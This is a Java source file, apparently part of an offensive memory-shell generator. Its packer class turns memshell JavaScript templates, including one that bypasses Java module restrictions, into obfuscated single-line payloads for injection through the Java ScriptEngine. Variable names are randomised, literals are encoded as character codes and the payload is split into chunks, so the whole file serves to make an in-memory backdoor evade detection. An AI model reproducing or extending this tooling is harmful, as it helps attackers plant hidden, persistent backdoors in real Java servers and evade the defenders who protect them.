package org.leo.jmg.mem.packer.scriptengine;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerCapability;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.PackerResources;
import org.leo.jmg.mem.packer.obfuscation.LiteralObfuscator;
import org.leo.jmg.mem.packer.obfuscation.PayloadObfuscator;

@PackerMeta(
        name = "DefaultScriptEngine",
        group = "ScriptEngine",
        order = 1,
        requiredCapabilities = PackerCapability.JAVASCRIPT_ENGINE,
        requiredClasses = "javax.script.ScriptEngineManager"
)
public class DefaultScriptEnginePacker implements Packer {
    private final String jsTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngine.js.txt");
    private final String jsBypassModuleTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngineBypassModule.js.txt");

    @Override
    public String pack(ClassPackerConfig config) {
        String template = config.isByPassJavaModule() ? jsBypassModuleTemplate : jsTemplate;
        // TemplateRenderer 在渲染阶段完成变量名随机化（{{VAR:x}} 占位符）
        String script = TemplateRenderer.render(template, config);
        return scriptToSingleLine(PayloadObfuscator.chunk(
                LiteralObfuscator.javascriptCharCodes(script)));
    }

    /**
     * 压缩 JavaScript，并统一使用单引号，避免各模板和 payload 分块重新引入双引号。
     */
    public static String scriptToSingleLine(String script) {
        return script.replace("\n", "")
                .replaceAll("(?m)^[ \t]+|[ \t]+$", "")
                .replaceAll("[ \t]{2,}", " ")
                .replace('"', '\'');
    }
}
